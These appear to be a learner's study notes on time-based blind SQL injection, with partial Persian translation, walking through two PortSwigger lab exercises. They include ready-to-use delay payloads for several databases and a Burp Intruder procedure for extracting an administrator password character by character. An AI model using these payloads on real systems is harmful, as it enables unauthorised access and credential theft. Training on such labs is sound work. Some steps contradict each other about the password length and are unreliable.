Source: https://portswigger.net/web-security/sql-injection/blind
|   Exploiting blind SQL injection by triggering time delays
|
|   But what if the application catches these errors and handles them gracefully? 
|   اما اگر برنامه این خطاها را دریافت کند و با ظرافت با آنها برخورد کند، چه؟
|
|   In this situation, it is often possible to exploit the blind SQL injection vulnerability 
|   by triggering time delays conditionally, depending on an injected condition.
|    
|   Because SQL queries are generally processed synchronously by the application, 
|   delaying the execution of a SQL query will also delay the HTTP response. 
|   از آنجا که پرس و جوهای اس‌کیو‌ال عموماً توسط برنامه به صورت همزمان پردازش می شوند،
|   تأخیر در اجرای پرس و جوی اس‌کیو‌ال پاسخ اچ‌تی‌تی‌پی را نیز به تأخیر می اندازد.
|
|   This allows us to infer the truth of the injected condition based on the time taken 
|   before the HTTP response is received. 
|   
|   On Microsoft SQL Server, input like the following can be used 
|   to test a condition and trigger a delay depending on whether the expression is true: 
|   |
|   |==>    '; IF (1=2) WAITFOR DELAY '0:0:10'--
|   |==>    '; IF (1=1) WAITFOR DELAY '0:0:10'--
|   |
|   |____So: The first of these inputs will not trigger a delay, 
|            because the condition 1=2 is false. 
|            The second input will trigger a delay of 10 seconds, 
|            because the condition 1=1 is true. 
|
|   Using this technique, we can retrieve data in the way already described, 
|   by systematically testing one character at a time: 
|   |
|   |==>    '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
|   |
|   |___So: Get Password by Time delaying



Lab: Blind SQL injection with time delays:
    Source: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
    
    vulnerable parameter.

    Target:
    Prove that the field is vulnerable to blind SQLi (Time Based)
    To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
    
    Step 1: Burp On
    Step 2: Hint Go to  SQL injection cheat sheet.  -->  https://portswigger.net/web-security/sql-injection/cheat-sheet
    Step 3: Try each ones
    Payloads:
        Oracle -----------> dbms_pipe.receive_message(('a'),10)
        Microsoft --------> WAITFOR DELAY '0:0:10'
        PostgreSQL ------->	SELECT pg_sleep(10)
        MySQL 	----------> SELECT SLEEP(10) 
    In addition this injection code:
        ' || ()--
        ' || (dbms_pipe.receive_message(('a'),10))--
        ' || (WAITFOR DELAY '0:0:10')--
        ' || (SELECT pg_sleep(10))--
        ' || (SELECT SLEEP(10))--




Lab Source 2: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval


Target: To solve the lab, log in as the administrator user. 
        Password of administrator than Login

Step-1
    ' || pg_sleep(10)--
    Result: this query is true

Step-2
    if users table is does { 
         sleep 10 second 
    } 
    else if users table is doesn't { 
         dont sleep
    }
    True?? Yes
    ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--

    False?? Yes
    ' || (select case when (1=2) then pg_sleep(10) else pg_sleep(-1) end)--


    ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
    Result = administrator username is exist

Step-3 
    Enumerate the Password length  xxxx  xxxxx xxxx???

    ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
    So is delay => password lenght is more than 1

    ' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
    So is delay => password lenght is less than 25


    Result: password lenght >= 25 

Step-4
    Send Result length password to Intruder


Step-5
    Resource Pool > Create new resource pool > Maximum concurrent requests = 1

Step-6
    Start attack
    This is can a get some time

    Result: length is 20 Characters.


Step-7
    Enumerate the administrator password
    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--


Step-8
    Send step before to Intruder
    
    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

    2fd2pzgrjq3aa58gh16p

Step-9
    Check Resource Pool is mark "Custom resource pool 1"
    Result: is it good query to get password ?


Step-10
    Send to Intruder

Step-11    
    1- Attack type = Cluster bomb
    
    2- Select to Payloads

    3- Check Payloads for two cases

    4- Check Resource pool is "Custom resource pool 1"

Step-12
    Start attack

Step-14
    when finished
    1- Columns > Response received 
    2- order by Response time

Step-15
    Write password characters in some place

Step-16
    Login with that




